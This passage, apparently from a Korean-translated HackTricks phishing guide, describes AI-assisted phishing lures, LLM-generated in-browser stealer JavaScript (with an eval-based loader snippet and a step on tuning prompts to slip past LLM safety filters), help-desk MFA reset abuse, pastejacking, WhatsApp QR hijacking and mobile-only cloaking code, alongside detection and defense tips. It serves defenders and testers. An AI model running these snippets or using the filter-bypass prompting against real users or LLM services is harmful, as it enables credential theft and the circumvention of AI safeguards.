|생성형 AI|공개된 M&A 정보와 소셜 미디어의 내부 농담을 언급하는 *일회성* 이메일을 작성하고, 콜백 사기에 사용할 CEO의 deep-fake 음성을 만듭니다.|
|에이전트형 AI|도메인을 자율적으로 등록하고, 공개 출처 정보를 수집하며, 피해자가 클릭했지만 자격 증명을 제출하지 않을 때 다음 단계의 메일을 작성합니다.|

**방어:**  
• ARC/DKIM 이상 징후를 기반으로 신뢰할 수 없는 자동화 시스템에서 발송된 메시지를 강조 표시하는 **동적 배너**를 추가합니다.  
• 위험도가 높은 전화 요청에는 **음성 생체 인증 확인 문구**를 도입합니다.  
• 인식 제고 프로그램에서 AI가 생성한 미끼를 지속적으로 시뮬레이션합니다. 정적인 템플릿은 더 이상 효과가 없습니다.

자격 증명 피싱을 위한 에이전트형 브라우징 악용도 참조하세요.

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

비밀 정보 인벤토리 및 탐지를 위한 로컬 CLI 도구와 MCP의 AI agent 악용도 참조하세요.

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## 피싱 JavaScript의 LLM 지원 런타임 조립(브라우저 내 코드 생성)

공격자는 무해해 보이는 HTML을 배포한 다음, **신뢰할 수 있는 LLM API**에 JavaScript를 요청해 **런타임에 정보 탈취 코드를 생성**하고 브라우저에서 실행할 수 있습니다(예: `eval` 또는 동적 `<script>`).<sup>[[8]](#references)</sup>

1. **프롬프트를 통한 난독화:** 프롬프트에 유출 URL/Base64 문자열을 인코딩하고, 안전 필터를 우회하고 환각을 줄이도록 문구를 반복해서 조정합니다.
2. **클라이언트 측 API 호출:** 페이지 로드 시 JS가 공개 LLM(Gemini/DeepSeek 등) 또는 CDN 프록시를 호출합니다. 정적 HTML에는 프롬프트/API 호출만 포함됩니다.
3. **조립 및 실행:** 응답을 이어 붙여 실행합니다(방문할 때마다 다형적으로 변경).

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** 생성된 코드가 유인 문구를 개인화하고(예: LogoKit token parsing), creds를 프롬프트에 숨겨진 endpoint로 전송합니다.

**회피 특성**
- 트래픽은 잘 알려진 LLM 도메인이나 평판이 좋은 CDN proxy를 거칩니다. 때로는 backend로 향하는 WebSockets를 사용합니다.
- 정적 payload는 없습니다. 악성 JS는 렌더링 후에만 존재합니다.
- 비결정적 생성으로 세션마다 **고유한** stealer가 만들어집니다.

**탐지 아이디어**
- JS를 활성화한 sandbox를 실행하고, LLM 응답에서 유래한 **runtime `eval`/동적 script 생성**을 탐지합니다.
- 프런트엔드에서 LLM API로 POST를 보낸 직후 반환된 텍스트에 `eval`/`Function`을 호출하는 경우를 헌팅합니다.
- 클라이언트 트래픽에서 승인되지 않은 LLM 도메인이 탐지된 뒤 credential POST가 발생하면 경고합니다.

---

## MFA Fatigue / Push Bombing 변형 – 강제 재설정
기존 push-bombing 외에도, 공격자는 헬프데스크 통화 중에 **새 MFA 등록을 강제**하여 사용자의 기존 token을 무효화합니다. 이후 표시되는 로그인 prompt는 피해자에게 정상적인 것으로 보입니다.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta 이벤트 중 **`deleteMFA` + `addMFA`**가 동일한 IP에서 몇 분 이내에 발생하는 경우를 모니터링하세요.



## Clipboard Hijacking / Pastejacking

공격자는 침해되었거나 타이포스쿼팅된 웹 페이지에서 피해자의 클립보드에 악성 명령을 몰래 복사한 다음, 사용자가 해당 명령을 **Win + R**, **Win + X** 또는 터미널 창에 붙여넣도록 유도해 다운로드나 첨부 파일 없이 임의의 코드를 실행할 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## 모바일 피싱 및 악성 앱 배포 (Android 및 iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR 기반 사회공학을 통한 WhatsApp 기기 연결 탈취
* 유인 페이지(예: 가짜 정부 부처/CERT “채널”)에 WhatsApp Web/Desktop QR 코드를 표시하고 피해자에게 스캔하도록 안내해, 공격자를 **연결된 기기**로 몰래 추가합니다.<sup>[[12]](#references)</sup>
* 공격자는 세션이 제거될 때까지 채팅/연락처를 즉시 확인할 수 있습니다. 피해자는 나중에 “새 기기가 연결됨” 알림을 볼 수 있습니다. 방어자는 신뢰할 수 없는 QR 페이지 방문 직후 발생한 예상치 못한 기기 연결 이벤트를 찾아낼 수 있습니다.

### 크롤러/샌드박스 회피를 위한 모바일 제한 피싱
운영자는 데스크톱 크롤러가 최종 페이지에 도달하지 못하도록 간단한 기기 확인 뒤에 피싱 흐름을 두는 경우가 늘고 있습니다. 일반적인 방식은 터치가 가능한 DOM인지 확인하고 그 결과를 서버 엔드포인트에 전송하는 짧은 스크립트를 사용하는 것입니다. 모바일이 아닌 클라이언트에는 HTTP 500(또는 빈 페이지)을 반환하고, 모바일 사용자에게는 전체 흐름을 제공합니다.<sup>[[7]](#references)</sup>

최소 클라이언트 스니펫 (일반적인 로직):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logic (simplified):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Server에서 흔히 관찰되는 동작:
- 첫 로드 시 세션 쿠키를 설정합니다.
- `POST /detect {"is_mobile":true|false}` 요청을 허용합니다.
- 후속 GET 요청에서 `is_mobile=false`이면 500(또는 placeholder)을 반환하고, `true`일 때만 phishing 페이지를 제공합니다.

헌팅 및 탐지 휴리스틱:
- urlscan 쿼리: `filename:"detect_device.js" AND page.status:500`
- 웹 텔레메트리: `GET /static/detect_device.js` → `POST /detect` → 모바일이 아닌 경우 HTTP 500으로 이어지는 시퀀스. 정상적인 모바일 피해자 경로에서는 200 응답과 후속 HTML/JS가 반환됩니다.
- `ontouchstart` 또는 이와 유사한 기기 확인만으로 콘텐츠를 표시하는 페이지를 차단하거나 면밀히 조사합니다.

방어 팁:
- 모바일과 유사한 fingerprint를 사용하고 JS를 활성화한 상태로 crawler를 실행해 차단된 콘텐츠를 확인합니다.
- 새로 등록된 도메인에서 `POST /detect` 이후 의심스러운 500 응답이 발생하면 경고를 발생시킵니다.

## References

- [1] [phishing에 사용되는 도메인 변형 생성 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [phishing 찾기: 도구와 기법 (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC를 사용해 자격 증명 탈취 및 2FA 우회하기 (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC로 세션을 탈취하고 2FA 우회하기 (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy에서 Postfix와 함께 DKIM 설치 및 구성하는 방법 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 글로벌 인시던트 대응 보고서 – 소셜 엔지니어링 에디션](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – 모바일 게이트형 phishing 인프라와 휴리스틱 (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [런타임 어셈블리 공격의 새로운 지평: LLM을 활용해 실시간으로 phishing JavaScript 생성하기](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [사칭, 클릭 하이재킹, TDS: 악성코드 유포 생태계 내부](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com 비트스쿼팅 (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [비트 플리핑으로 Microsoft의 windows.com 트래픽 하이재킹하기 (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [사랑? 그럴 리가: 파키스탄 표적 스파이웨어 캠페인의 미끼로 사용된 가짜 데이팅 앱](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC 및 샘플](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
